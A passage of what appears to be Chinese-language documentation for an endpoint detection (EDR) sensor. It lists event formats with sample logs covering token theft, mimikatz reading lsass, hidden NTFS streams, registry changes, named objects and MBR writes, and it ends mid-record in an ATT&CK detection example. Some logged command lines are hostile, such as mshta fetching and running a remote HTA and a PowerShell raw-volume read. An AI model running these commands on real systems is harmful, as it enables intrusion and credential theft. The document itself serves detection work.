TargetToken = {"accountname":"system","impersonationlevel":"","integritylevel":"system","privilege":"seassignprimarytokenprivilege;selockmemoryprivilege;seincreasequotaprivilege;setcbprivilege;setakeownershipprivilege;seloaddriverprivilege;sesystemprofileprivilege;seprofilesingleprocessprivilege;seincreasebasepriorityprivilege;secreatepagefileprivilege;secreatepermanentprivilege;sebackupprivilege;serestoreprivilege;seshutdownprivilege;sedebugprivilege;seauditprivilege;sechangenotifyprivilege;seimpersonateprivilege;secreateglobalprivilege;seincreaseworkingsetprivilege;setimezoneprivilege;secreatesymboliclinkprivilege;sedelegatesessionuserimpersonateprivilege","sessionid":1,"sid":"s-1-5-18","tokentype":"tokenprimary"}
TokenFlag = 3
ProcessGuid = 03428dde02981920003a1abfea9dda01
UniqueID = 3d8d4189-0e65-42b6-9dee-f4c240888d7b
```

通过命名对象模拟令牌：

```
EventID = 61
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:36:01
ProcessID = 4884
ProcessName = namedpipeserver.exe
ProcessImage = e:\test\namedpipeserver.exe
ProcessMD5 = e62fb22d75575518c7335d43e0454ecd
OperatorToken = {"accountname":"lxg","impersonationlevel":"","integritylevel":"high","privilege":"sechangenotifyprivilege;seimpersonateprivilege;secreateglobalprivilege","sessionid":1,"sid":"s-1-5-21-219989340-3751043042-229602202-1000","tokentype":"tokenprimary"}
TargetToken = {"accountname":"administrator","impersonationlevel":"securityimpersonation","integritylevel":"high","privilege":"sechangenotifyprivilege;seimpersonateprivilege;secreateglobalprivilege","sessionid":1,"sid":"s-1-5-21-219989340-3751043042-229602202-1000","tokentype":"tokenimpersonation"}
TokenFlag = 5
ProcessGuid = 03973d7715801314003a4a8dfe9dda01
UniqueID = 38d8a16f-1b38-4f2e-9a0f-56cd37378053
```

#### CreateProcessSetToken

创建进程设置新令牌信息格式：

```
EventID = 60
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:18:32
ProcessID = 7364
ProcessName = notepad.exe
ProcessImage = c:\windows\notepad.exe
ProcessMD5 = f60a9d3a9461f68de0fccebb0c6cb31a
OperatorToken = {"accountname":"system","impersonationlevel":"","integritylevel":"system","privilege":"seassignprimarytokenprivilege;selockmemoryprivilege;seincreasequotaprivilege;setcbprivilege;setakeownershipprivilege;seloaddriverprivilege;sesystemprofileprivilege;seprofilesingleprocessprivilege;seincreasebasepriorityprivilege;secreatepagefileprivilege;secreatepermanentprivilege;sebackupprivilege;serestoreprivilege;seshutdownprivilege;sedebugprivilege;seauditprivilege;sechangenotifyprivilege;seimpersonateprivilege;secreateglobalprivilege;seincreaseworkingsetprivilege;setimezoneprivilege;secreatesymboliclinkprivilege;sedelegatesessionuserimpersonateprivilege","sessionid":0,"sid":"s-1-5-18","tokentype":"tokenprimary"}
TargetToken = {"accountname":"system","impersonationlevel":"","integritylevel":"system","privilege":"seassignprimarytokenprivilege;selockmemoryprivilege;seincreasequotaprivilege;setcbprivilege;setakeownershipprivilege;seloaddriverprivilege;sesystemprofileprivilege;seprofilesingleprocessprivilege;seincreasebasepriorityprivilege;secreatepagefileprivilege;secreatepermanentprivilege;sebackupprivilege;serestoreprivilege;seshutdownprivilege;sedebugprivilege;seauditprivilege;sechangenotifyprivilege;seimpersonateprivilege;secreateglobalprivilege;seincreaseworkingsetprivilege;setimezoneprivilege;secreatesymboliclinkprivilege;sedelegatesessionuserimpersonateprivilege","sessionid":1,"sid":"s-1-5-18","tokentype":"tokenprimary"}
TokenFlag = 1
ParentProcessID = 3784
ParentProcessImage = c:\program files\process hacker 2\processhacker.exe
ParentProcessMD5 = b365af317ae730a67c936f21432b9c71
ParentProcessName = processhacker.exe
ProcessGuid = e3708df10ec81cc4003a8daaea9dda01
ParentProcessGuid = e2cbaf0602980ec8003a0a35ea9dda01
UniqueID = 46d4fa12-8665-4251-9ec7-a9e6ae8431af
```

### 凭据组

#### StealingCredentials

盗取凭据信息格式：

```
EventID = 71
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:27:21
ProcessID = 5524
ProcessName = mimikatz.exe
ProcessImage = c:\test\bin\mimikatz.exe
ProcessMD5 = 29efd64dd3c7fe1e2b022b7ad73a1ba5
CredType = 12
CredDesc = [lsass]:read lsass security dll mmeory lsasrv.dll
ProcessGuid = cce621a515801594003a9dabeb9dda01
UniqueID = 10577fdd-d331-44cf-8288-39874a2414a6
```

用途： CredType凭据类型，支持十多种凭据盗取监测，支持十几种应用凭据盗取监测

### 文件组

#### FileCreate

创建文件信息格式：

```
EventID = 23
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:35:48
ProcessID = 5504
ProcessName = explorer.exe
ProcessImage = c:\windows\explorer.exe
ProcessMD5 = d2af87b360db77e076881938c91fa276
FileName = e:\dnsquery.vmp.exe
FileMD5 = 3c4b348ab52f5543e4ef225221c5af4f
FileClass = 1
FileClassDescription = binary
FileFormat = 4
FileFormatDescription = pe_exe
Signature = 0
SignVendor = NULL
DriverType = 1
DetectionMajorType = 1
DetectionMinorType = 0
DetectionContent = vmprotect(2.x)[-]
ProcessGuid = c1496e8415501580003a4d19e89dda01
UniqueID = d111def1-87b8-41a7-a3f4-06a751728ff9
```

```
EventID = 23
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:37:41
ProcessID = 5504
ProcessName = explorer.exe
ProcessImage = c:\windows\explorer.exe
ProcessMD5 = d2af87b360db77e076881938c91fa276
FileName = e:\test6.sdb
FileMD5 = NULL
FileClass = 16
FileClassDescription = db
FileFormat = 128
FileFormatDescription = sdb
Signature = 0
SignVendor = NULL
DriverType = 1
DetectionMajorType = 2
DetectionMinorType = 0
DetectionContent = runashighest;runasinvoker
ProcessGuid = c1496e8415501580003a4d19e89dda01
UniqueID = 1794094f-d430-4d22-9609-7857bfd7ce82
```

用途：文件创建支持格式识别，pe_exe，支持壳识别 vmprotect(2.x)[-]，支持sdb垫片攻击类型监测，目前OLE攻击监测还未合入，后续合入

#### FileDelete

文件删除信息格式：

```
EventID = 22
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:39:16
ProcessID = 5504
ProcessName = explorer.exe
ProcessImage = c:\windows\explorer.exe
ProcessMD5 = d2af87b360db77e076881938c91fa276
FileName = e:\test6.sdb
FileMD5 = NULL
FileClass = 16
FileClassDescription = db
FileFormat = 128
FileFormatDescription = sdb
DriverType = 1
ProcessGuid = c1496e8415501580003a4d19e89dda01
UniqueID = 2abdfd53-1d51-4a14-b934-90f5a0900735
```

#### FileChangeAttributes

文件属性修改信息格式：

```
EventID = 21
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:40:37
ProcessID = 4864
ProcessName = dllhost.exe
ProcessImage = c:\windows\system32\dllhost.exe
ProcessMD5 = 2d29c0afcc8225aff6637f7362c22960
FileName = e:\mimikatz.exe
FileMD5 = 29efd64dd3c7fe1e2b022b7ad73a1ba5
FileClass = 1
FileClassDescription = binary
FileFormat = 7
FileFormatDescription = pe_exe64
Flag = 64
OrgCreateTime = NULL
NewCreateTime = NULL
Signature = 0
SignVendor = NULL
DriverType = 1
ProcessGuid = f4fc729103341300003a7a67ed9dda01
UniqueID = b21bf2f4-bd13-4c69-9dc0-fa114c4a1d73
```

```
EventID = 21
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:46:56
ProcessID = 4052
ProcessName = filetest.exe
ProcessImage = c:\users\lxg\desktop\filetest.exe
ProcessMD5 = ee9f3ca8b8d3219cac805f5b090eea50
FileName = c:\users\lxg\desktop\remotedll64.exe
FileMD5 = 3fa8b55dcfe964bfe0d9a251dddfce21
FileClass = 1
FileClassDescription = binary
FileFormat = 7
FileFormatDescription = pe_exe64
Flag = 15
OrgCreateTime = 2022/12/09 16:00:00
NewCreateTime = 2022/12/10 16:00:00
Signature = 0
SignVendor = NULL
DriverType = 1
ProcessGuid = 387ffac415800fd4003a7a67ee9dda01
UniqueID = 904a9390-1b05-405b-b20a-f85b0516180c
```

用途：文件属性修改。主要针对文件隐藏，去除文件只读，修改文件创建时间

#### FileRename

重命名文件信息格式：

```
EventID = 64
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:51:16
ProcessID = 5504
ProcessName = explorer.exe
ProcessImage = c:\windows\explorer.exe
ProcessMD5 = d2af87b360db77e076881938c91fa276
FileName = c:\users\lxg\desktop\testtask.exe
FileMD5 = 274dc818056c40e9731bdcf5296745e9
FileClass = 1
FileClassDescription = binary
FileFormat = 4
FileFormatDescription = pe_exe
NewFileName = c:\users\lxg\desktop\node.exe
Signature = 0
SignVendor = NULL
DriverType = 1
ProcessGuid = c1496e8415501580003a4d19e89dda01
UniqueID = c988118a-5446-48e1-8d26-0e546f360b82
```

#### FileMove

移动文件信息格式：

```
EventID = 66
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:55:19
ProcessID = 5504
ProcessName = explorer.exe
ProcessImage = c:\windows\explorer.exe
ProcessMD5 = d2af87b360db77e076881938c91fa276
FileName = c:\users\lxg\desktop\node.exe
FileMD5 = 274dc818056c40e9731bdcf5296745e9
FileClass = 1
FileClassDescription = binary
FileFormat = 4
FileFormatDescription = pe_exe
NewFileName = c:\test\bin\node.exe
Signature = 0
SignVendor = NULL
DriverType = 1
ProcessGuid = c1496e8415501580003a4d19e89dda01
UniqueID = af333ac5-c5e6-4186-b60e-24481a84e567
```

#### FileRead

文件读取信息格式：

```
EventID = 68
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:59:54
ProcessID = 5504
ProcessName = explorer.exe
ProcessImage = c:\windows\explorer.exe
ProcessMD5 = d2af87b360db77e076881938c91fa276
FileName = c:\users\lxg\appdata\roaming\microsoft\credentials\ecda087f482a7254785d010fd0efebfa
DriverType = 1
ProcessGuid = c1496e8415501580003a4d19e89dda01
Description = cred
FileType = 721
UniqueID = 2c08897c-d606-4833-991b-bdd95443c189
```

用途：监测读取关键性文件，例如凭据文件，私密文件，重要业务配置文件等

#### FileWrite

文件写入信息格式：

```
EventID = 65
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 15:05:53
ProcessID = 7320
ProcessName = notepad.exe
ProcessImage = c:\windows\system32\notepad.exe
ProcessMD5 = f60a9d3a9461f68de0fccebb0c6cb31a
FileName = c:\windows\system32\grouppolicy\gpt.ini
DriverType = 1
ProcessGuid = 729cce0a15801c98003acac3f19dda01
Description = gpscript
FileType = 603
UniqueID = 01e9c04e-03fd-40b4-8b49-485c14cc2be7
```

用途：监测写入关键性文件，例如凭据文件，私密文件，登录脚本，重要业务配置文件等

#### FileSetEa

文件写入扩展属性信息格式：

```
EventID = 69
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 15:11:35
ProcessID = 1360
ProcessName = filetest.exe
ProcessImage = c:\users\lxg\desktop\filetest.exe
ProcessMD5 = ee9f3ca8b8d3219cac805f5b090eea50
FileName = c:\users\lxg\desktop\remotedll64.exe
DriverType = 1
ProcessGuid = 1acf6d8115800550003a2a84f29dda01
Description = NULL
FileType = 0
UniqueID = 24ef055f-eda0-4ff9-be91-4a473f7ca3d4
```

用途：针对隐藏攻击监测，攻击者会将脚本，混淆代码，或者二进制写入EA扩展属性

#### FileStreamCreate

创建文件流信息格式：

```
EventID = 24
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 15:18:49
ProcessID = 7028
ProcessName = certutil.exe
ProcessImage = c:\windows\system32\certutil.exe
ProcessMD5 = 806d85b3c89aebb0e99ed3679dd3408f
FileName = e:\test\win-hide-ntfs-ads\certutil.txt:test.ps1
FileMD5 = 40f4058b140b328ada90e9f4815bf639
FileClass = 8
FileClassDescription = script
FileFormat = 74
FileFormatDescription = js
DriverType = 1
ProcessGuid = 4e38c769133c1b74003a3a7ef39dda01
UniqueID = d14f2500-f0cf-4668-97af-e3bcf89fb285
```

用途：针对隐藏攻击监测，攻击者会将脚本，混淆代码，或者二进制写入文件Stream，或者通过各种浏览器，下载文件写入流

#### FileStreamDelete

删除文件流信息格式：

```
EventID = 25
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 15:49:25
ProcessID = 4728
ProcessName = streams64.exe
ProcessImage = e:\win-hide-ntfs-ads\streams64.exe
ProcessMD5 = ff73c9cb2ff29f0af030224840c1c451
FileName = e:\win-hide-ntfs-ads\remote-expand.txt:file.bat
FileMD5 = e4bf4bc8cbf735ee9eae8d382dffff4c
FileClass = 8
FileClassDescription = script
FileFormat = 78
FileFormatDescription = winbatch
DriverType = 1
ProcessGuid = 95780ec20be41278003addaef79dda01
UniqueID = 632c81e5-9e4a-4114-a340-82a43cfa988f
```

#### AccessVolume

直接访问卷信息格式：

```
EventID = 73
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 15:29:25
ProcessID = 6112
ProcessName = powershell.exe
ProcessImage = c:\windows\system32\windowspowershell\v1.0\powershell.exe
ProcessMD5 = f7722b62b4014e0c50adfa9d60cafa1c
FileName = c:
AccessType = 3
DriverType = 0
ProcessGuid = bc878528158017e0003a9a96f49dda01
UniqueID = a145efa1-b68f-4181-96de-4508f7120e13
```

### Powershell组

#### Powershell

powershell执行信息格式

```
 EventID = 101
 BootTime = 2024/05/04 14:00:41
 AgentID = d0c951b3b2fe6bba106840972c7c904f
 Time = 2024/05/04 15:29:25 
 UniqueID = 247cfce7-bd39-4470-bb7d-58cac8f8129d 
 ProcessID = 6112 
 ProcessName = powershell.exe 
 ProcessImage = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
 ProcessMD5 = f7722b62b4014e0c50adfa9d60cafa1c 
 ProcessGuid = bc878528158017e0003a9a96f49dda01 
 ProcessCommandLine = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  
 FileName = E:\test\win-direct-volume-access.ps1 
 SessionID = 10 
 Content = $buffer = New-Object byte[] 11 $handle = New-Object IO.FileStream "\\.\C:", 'Open', 'Read', 'ReadWrite' $handle.Read($buffer, 0, $buffer.Length) $handle.Close() Format-Hex -InputObject $buffer 
```

注意： Event Log所有数据，目前并未广播到FrameTool中，可以到windows日志管理器查看，或者直接到安装目录下的C:\Program Files\SensorEdr\data\forensics.db数据库中查看

### Reg组

#### RegKeyCreate

创建键信息格式：

```
EventID = 26
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 15:57:09
ProcessID = 2764
ProcessName = regedit.exe
ProcessImage = c:\windows\regedit.exe
ProcessMD5 = a3b1fc6c72ea944c2e1b359a19cb40ab
ObjectName = hkey_local_machine\software\microsoft\terminal server client\servers\rdp0\
Description = connection histrory
Classification=rdp
ProcessGuid = 7575904e19a80acc003aaa49f89dda01
UniqueID = b8401a3e-8ab9-4807-807b-cbb2d46359be
```

#### RegKeyRename

重命名键信息格式：

```
EventID = 28
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 15:57:11
ProcessID = 2764
ProcessName = regedit.exe
ProcessImage = c:\windows\regedit.exe
ProcessMD5 = a3b1fc6c72ea944c2e1b359a19cb40ab
ObjectName = hkey_local_machine\software\microsoft\terminal server client\servers\rdp0\
NewName = test
Description = connection histrory
Classification=rdp
ProcessGuid = 7575904e19a80acc003aaa49f89dda01
UniqueID = 302b410f-66bd-48c6-b384-c7732a998b4e
```

#### RegKeyDelete

删除键信息格式：

```
EventID = 27
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 15:59:23
ProcessID = 2764
ProcessName = regedit.exe
ProcessImage = c:\windows\regedit.exe
ProcessMD5 = a3b1fc6c72ea944c2e1b359a19cb40ab
ObjectName = hkey_local_machine\software\microsoft\terminal server client\servers\test\
Description = connection histrory
Classification=rdp
ProcessGuid = 7575904e19a80acc003aaa49f89dda01
UniqueID = a0f0f4f3-ece7-4cd3-abd0-02b049e8ffd1
```

#### RegValueSet

设置键值信息格式：

```
EventID = 29
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:01:33
ProcessID = 2764
ProcessName = regedit.exe
ProcessImage = c:\windows\regedit.exe
ProcessMD5 = a3b1fc6c72ea944c2e1b359a19cb40ab
ObjectName = hkey_local_machine\system\currentcontrolset\control\lsa\runasppl
ObjectValue = 0x00000000
Description = ppl protected
Classification=lsass
ProcessGuid = 7575904e19a80acc003aaa49f89dda01
ValueExist = 0
UniqueID = faca7d5e-416a-4720-bcff-a931aa156207
```

#### RegValueDelete

删除键值信息格式：

```
EventID = 30
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:02:32
ProcessID = 2764
ProcessName = regedit.exe
ProcessImage = c:\windows\regedit.exe
ProcessMD5 = a3b1fc6c72ea944c2e1b359a19cb40ab
ObjectName = hkey_local_machine\system\currentcontrolset\control\lsa\runasppl
Description = ppl protected
Classification=lsass
ProcessGuid = 7575904e19a80acc003aaa49f89dda01
UniqueID = 7fc04308-c528-464f-b27a-3155a6cc8235
```

#### RegValueQuery

键值查询信息格式：

```
EventID = 67
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:04:54
ProcessID = 2764
ProcessName = regedit.exe
ProcessImage = c:\windows\regedit.exe
ProcessMD5 = a3b1fc6c72ea944c2e1b359a19cb40ab
ObjectName = hkey_local_machine\software\microsoft\windows\currentversion\app paths\cmmgr32.exe\cmstpextensiondll
ObjectValue = c:\windows\system32\cmcfg32.dll
Description = cmstp
Classification=cmstp
ProcessGuid = 7575904e19a80acc003aaa49f89dda01
ValueExist = 0
UniqueID = 3ee41923-e60e-4907-99b2-d542860e8381
```

用途：针对关键信息查询，例如密钥查询等

### 命名对象组

注意：命名对象组默认关闭，命名对象组主要用于针对已经病毒等，配置命名对象监测，只能进行反向配置.

#### FileMappingCreate

mapping create信息格式：

```
EventID = 41
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:14:48
ProcessID = 7884
ProcessName = filemappingserver.exe
ProcessImage = e:\test\filemappingserver.exe
ProcessMD5 = c7d407d3a5b5cfa426653f1e7b4efcca
FileMappingName = global\myfilemappingobject
StackModule = e:\test\filemappingserver.exe
ProcessGuid = 20eb4a5d15801ecc003a1afcfb9dda01
UniqueID = a91954f2-d3a2-4ac1-ba75-5107785b504d
```

#### FileMappingConnect

mapping connect信息格式：

```
EventID = 42
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:16:04
ProcessID = 2296
ProcessName = filemappingclient.exe
ProcessImage = e:\test\filemappingclient.exe
ProcessMD5 = f49e0107401fd7c3da45048cf0aded48
FileMappingName = global\myfilemappingobject
StackModule = e:\test\filemappingclient.exe
ProcessGuid = 17acd3af158008f8003adad3fb9dda01
UniqueID = 488d3066-6e8f-4c8e-bdf9-d756d5dc1d78
```

#### PipeCreate

创建pipe的信息格式：

```
EventID = 35
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:23:18
ProcessID = 3992
ProcessName = pipeserver.exe
ProcessImage = e:\test\pipeserver.exe
ProcessMD5 = c7148c08c28c0137bd8cf5d238c5c8b6
PipeName = \??\pipe\mynamedpipe
ProcessGuid = 511582d715800f98003a0a9efc9dda01
UniqueID = 3892a025-d547-421b-a56b-b0edd593027a
```

#### PipeConnect

连接pipe的信息格式：

```
EventID = 36
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:23:57
ProcessID = 4392
ProcessName = pipeclient.exe
ProcessImage = e:\test\pipeclient.exe
ProcessMD5 = aa238ebf3f8ad35cdc1e92a108fafcbd
PipeName = \??\pipe\mynamedpipe
ProcessGuid = 61c34f4315801128003a4a8dfc9dda01
UniqueID = 51341b3d-4a67-42b3-ae3b-6f978f45c1b7
```

#### MailSlotCreate

mailslot创建信息格式：

```
EventID = 39
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:27:26
ProcessID = 7152
ProcessName = mailslotserver.exe
ProcessImage = e:\test\mailslotserver.exe
ProcessMD5 = 6843a69027d79f0121e60cf89d459a27
MailSlotName = \??\mailslot\sample_mailslot
ProcessGuid = e46b66e815801bf0003a6d09fc9dda01
UniqueID = a2a802c0-d4a6-4af0-b80a-e019c464e1bd
```

#### MailSlotConnect

mailslot连接信息格式：

```
EventID = 40
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 16:27:58
ProcessID = 8
ProcessName = mailslotclient.exe
ProcessImage = e:\test\mailslotclient.exe
ProcessMD5 = 90f352ad410f0a3bd263b58b027ef2d5
MailSlotName = \??\mailslot\sample_mailslot
ProcessGuid = f7b2f4e015800008003a6d7efc9dda01
UniqueID = 47c42858-7e23-4e4e-890b-0c2e88fb4b6c
```

#### EventCreate

创建命名对象事件信息格式：

```
EventID = 37
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 17:34:52
ProcessID = 8916
ProcessName = tst.exe
ProcessImage = e:\test\tst.exe
ProcessMD5 = b8460351df5c18f883177e1865d54d74
ManualReset = auto-reset event
InitialState = nonsignaled
EventName = global\myevent
ProcessGuid = 5112bbda21b822d4003aed6b069eda01
UniqueID = e22a552c-35d0-4eed-9ed8-535eb9880e12
```

#### EventOpen

打开命名对象事件信息格式：

```
EventID = 38
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 17:38:11
ProcessID = 7848
ProcessName = tst.exe
ProcessImage = e:\test\tst.exe
ProcessMD5 = 71b2f979fdbdeb3fc8c9717ded60b316
DesiredAccess = 2031619
InheritHandle = inherit
EventName = global\myevent
ProcessGuid = c6f1599f21b81ea8003a1a41069eda01
UniqueID = da15df23-6aa8-4a50-873a-358d75800314
```

### 引导组

#### MBR

MBR修改引导信息格式：

```
EventID = 34
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 17:42:20
ProcessID = 6376
ProcessName = mbr.exe
ProcessImage = e:\test\mbr.exe
ProcessMD5 = 52959054b63c6b459ccccc8c229d3300
PhysicalName = \\.\physicaldrive0
DriverType = 0
ProcessGuid = 5c30314921b818e8003abd1a079eda01
UniqueID = c6f73f49-a3c9-49f5-a97d-fff6db471089
```

#### CBR

CBR修改引导暂未添加，后续添加

### Windows Event Log

Sensor Client也支持windows Event Log，目前内置了：

| Event ID | Name                   | Description        |
| -------- | ---------------------- | ------------------ |
| 4720     | CreateAccount          | 创建账户           |
| 4722     | EnableAccount          | 启用账户           |
| 4724     | ResetAccountPassword   | 重置账户密码       |
| 4725     | DisableAccount         | 禁用账户           |
| 4726     | DeleteAccount          | 删除账户           |
| 4738     | ModifyAccount          | 更改账户           |
| 4732     | AddAccountToGroup      | 账户添加到本地组   |
| 4733     | DeleteAccountFromGroup | 从本地组删除某账户 |
| 4731     | CreateGroup            | 创建启用本地组     |
| 4734     | DeleteGroup            | 删除本地组         |

Windows Event Log目前信息没有打到FrameTool面板中，数据结构可以去C:\Program Files\SensorEdr\data\forensics.db查看，要补加的可以修改C:\Program Files\SensorEdr\config\eventlogconfig.xml配置文件，Client会自动帮您创建表单，提取数据。例如：

```xml
	<table name="ev_4734" type="DeleteGroup" desc="删除本地组">
		<field name="EventID" data_type="smallint unsigned" node_type="Element" desc="事件ID"></field>
		<field name="BootTime" data_type="text" node_type="Element" desc="启动时间"></field>
		<field name="AgentID" data_type="text" node_type="Element" desc="agent_id"></field>
		<field name="Time" data_type="text" node_type="Element" desc="事件时间"></field>
		<field name="ProcessID" data_type="int unsigned" node_type="Element" desc="进程ID"></field>
		<field name="ProcessName" data_type="text" node_type="Element" desc="进程名"></field>
		<field name="ProcessImage" data_type="text" node_type="Element" desc="进程路径"></field>
		<field name="ProcessMD5" data_type="text" node_type="Element" desc="进程MD5"></field>				
		<field name="TargetUserName" data_type="text" node_type="Element" desc="目标用户名"></field>
		<field name="TargetDomainName" data_type="text" node_type="Element" desc="目标主机名"></field>
		<field name="TargetSid" data_type="text" node_type="Element" desc="目标SID"></field>
		<field name="SubjectUserSid" data_type="text" node_type="Element" desc="主体SID"></field>
		<field name="SubjectUserName" data_type="text" node_type="Element" desc="主体账户名"></field>	
		<field name="SubjectDomainName" data_type="text" node_type="Element" desc="主体主机名"></field>	
		<field name="SubjectLogonId" data_type="text" node_type="Element" desc="主体登录ID"></field>	
		<field name="ProcessGuid" data_type="text" node_type="Element" desc="进程GUID"></field>
		<field name="UniqueID" data_type="text" node_type="Element" desc="事件唯一ID"></field>		
		<field name="AttackMark" data_type="text" node_type="Element" desc="attack type"></field>
		<trigger name="UniqueTrigger">
			<field name="UniqueHash" data_type="text unique" desc="去重字段">SubjectUserSid,SubjectDomainName,TargetUserName,TargetDomainName</field>
			<field name="UniqueNumber" data_type="integer default 1" desc="去重统计"></field>
		</trigger>
		<filter name="eventlog" path="Security" eventid="4734" onoff="on"></filter>
	</table>
```

UniqueHash：是进行去重的计算字段

UniqueNumber：重复统计字段

## Attck IOA能力

目前Attck IOA已完成60%：已支持250多种技术攻击模式，后续会覆盖完全监测规则：

示例：下面是mshta remote攻击

```json
[
	{
		"AgentID" : "5b52cfcca998b6376b1ab43fea01cdfe",
		"AttackMark" : "4d749a25-d3a3-4a48-91ab-42014baab021:9:process_mshta|4d749a25-d3a3-4a48-91ab-42014baab021:9:process_mshta_net_feature",
		"BootTime" : "2024/01/03 16:42:09",
		"DriverType" : 1,
		"EventID" : 9,
		"OrgFileName" : "mshta.exe",
		"ParentProcessCommandLine" : "c:\\windows\\system32\\cmd.exe /c \"\"e:\\win-mshta-script\\win-mshta-remote-hta.bat\" \"",
		"ParentProcessGUID" : "4c5dc36b0f1818e800fa1916253eda01",
		"ParentProcessID" : 6376,
		"ParentProcessImage" : "c:\\windows\\system32\\cmd.exe",
		"ParentProcessMD5" : "94912c1d73ade68f2486ed4d8ea82de6",
		"ProcessCommandLine" : "mshta.exe  http://20.0.4.86/t1218.005.hta",
		"ProcessGUID" : "4d2a7f5d18e81930007afd32253eda01",
		"ProcessID" : 6448,
		"ProcessImage" : "c:\\windows\\system32\\mshta.exe",
		"ProcessMD5" : "98447a7f26ee9dac6b806924d6e21c90",
		"ProcessName" : "mshta.exe",
		"Session" : 1,
		"Time" : "2024/01/03 17:14:49",
		"UniqueID" : "5fcf3e24-d22e-4a5a-a76a-7ed0634ab5a8",
		"UserID" : "s-1-5-21-219989340-3751043042-229602202-1000",
		"id" : 1
	},
	{
		"AgentID" : "5b52cfcca998b6376b1ab43fea01cdfe",
		"AttackMark" : "3e5a0fda-4f8f-4b0a-8ae4-fdbac202abd8:9:process_mshta_child",
		"BootTime" : "2024/01/03 16:42:09",
		"DriverType" : 1,
		"EventID" : 9,
		"OrgFileName" : "cmd.exe",
		"ParentProcessCommandLine" : "mshta.exe  http://20.0.4.86/t1218.005.hta",
		"ParentProcessGUID" : "4d2a7f5d18e81930007afd32253eda01",
		"ParentProcessID" : 6448,
		"ParentProcessImage" : "c:\\windows\\system32\\mshta.exe",
		"ParentProcessMD5" : "98447a7f26ee9dac6b806924d6e21c90",
		"ProcessCommandLine" : "\"c:\\windows\\system32\\cmd.exe\" /c calc.exe",
		"ProcessGUID" : "4da4943219301b78007a6dad253eda01",
		"ProcessID" : 7032,
		"ProcessImage" : "c:\\windows\\system32\\cmd.exe",
		"ProcessMD5" : "94912c1d73ade68f2486ed4d8ea82de6",
		"ProcessName" : "cmd.exe",
		"Session" : 1,
		"Time" : "2024/01/03 17:14:49",
		"UniqueID" : "50f290e6-bb93-4eca-a26e-4b649f698542",
		"UserID" : "s-1-5-21-219989340-3751043042-229602202-1000",
		"id" : 2
	},
	{
		"AgentID" : "5b52cfcca998b6376b1ab43fea01cdfe",
		"AttackMark" : "4d749a25-d3a3-4a48-91ab-42014baab021:5:net_mshta_connect",
		"BootTime" : "2024/01/03 16:42:09",
		"DestinationIP" : "20.0.4.86",
		"DestinationIsIPv6" : 0,
		"DestinationPort" : 80,
		"Direction" : "outbound",
		"EventID" : 5,
		"ProcessGuid" : "4d2a7f5d18e81930007afd32253eda01",
		"ProcessID" : 6448,
		"ProcessImage" : "c:\\windows\\system32\\mshta.exe",
		"ProcessMD5" : "98447a7f26ee9dac6b806924d6e21c90",
		"ProcessName" : "mshta.exe",
		"Protocol" : "ipproto_tcp",
		"SourceIP" : "192.168.184.203",
		"SourceIsIPv6" : 0,
		"SourcePort" : 55585,
		"Time" : "2024/01/03 17:14:49",
		"UniqueID" : "bbd401e7-546e-4d66-b567-9fceecc1ad75",
		"id" : 3
	},
	{
